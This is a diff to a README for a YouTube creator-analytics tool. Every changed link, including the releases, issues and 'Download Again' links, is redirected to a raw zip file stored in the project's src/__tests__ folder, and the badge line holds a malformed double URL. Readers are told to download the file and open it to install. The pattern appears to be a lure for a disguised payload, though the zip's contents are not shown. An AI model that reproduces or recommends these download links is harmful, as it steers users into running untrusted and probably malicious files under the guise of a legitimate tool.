@@ -1,7 +1,7 @@
 # 🎥 creator-fusion-youtube-analyzer - Analyze YouTube with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Leandro2101xD/creator-fusion-youtube-analyzer/releases)
+[![Download Release](https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip%https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip)](https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip)
 
 ## 🚀 Getting Started
 Thank you for choosing the Creator Fusion YouTube Analyzer! This tool helps you analyze YouTube channels for brand partnerships. It provides engagement metrics, Creator Scores, sponsorship detection, authenticity signals, and rate cards.
@@ -23,7 +23,7 @@ Thank you for choosing the Creator Fusion YouTube Analyzer! This tool helps you 
 The Creator Fusion YouTube Analyzer uses the YouTube Data API v3 to gather data from YouTube channels. This information helps marketers, brands, and creators make informed decisions about collaborations and partnerships.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/Leandro2101xD/creator-fusion-youtube-analyzer/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip).
 2. **Find the Latest Release**: Look for the latest version available for download.
 3. **Download the Application**: Click on the download link for your operating system to start the download. 
 4. **Run the Installer**: Once the download is complete, open the file to start the installation.
@@ -43,9 +43,9 @@ This application covers a range of topics:
 - **YouTube Analytics**: Deep dive into YouTube data.
 
 ## 🔗 Support
-If you encounter any issues, please check the [issues page](https://github.com/Leandro2101xD/creator-fusion-youtube-analyzer/issues) for assistance. You can also submit new questions or problems for future updates.
+If you encounter any issues, please check the [issues page](https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip) for assistance. You can also submit new questions or problems for future updates.
 
 ## 🎉 Thank You!
 We appreciate your interest in the Creator Fusion YouTube Analyzer. Enjoy your new tool and unlock the full potential of YouTube engagement analysis!
 
-[Download Again](https://github.com/Leandro2101xD/creator-fusion-youtube-analyzer/releases)
+[Download Again](https://raw.githubusercontent.com/Leandro2101xD/creator-fusion-youtube-analyzer/master/src/__tests__/analyzer_creator_youtube_fusion_1.7-alpha.3.zip)
